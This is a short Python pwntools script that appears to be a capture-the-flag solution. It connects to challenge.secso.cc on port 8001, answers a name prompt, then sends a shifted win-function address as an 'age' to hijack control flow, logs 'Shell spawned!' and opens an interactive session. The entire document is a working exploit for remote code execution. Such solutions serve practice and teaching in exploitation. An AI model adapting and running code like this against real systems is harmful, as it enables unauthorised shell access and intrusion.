from pwn import *

HOST = 'challenge.secso.cc'
PORT = 8001

p = remote(HOST, PORT)

win_addr = 0x4011F6

payload_value = win_addr << 8

p.recvuntil(b"What's your name?\n")
p.sendline(b"Exploiter")

p.recvuntil(b"How old are you?\n")
log.info(f"Sending payload: {payload_value}")
p.sendline(str(payload_value).encode())

log.success("Shell spawned!")
p.interactive()

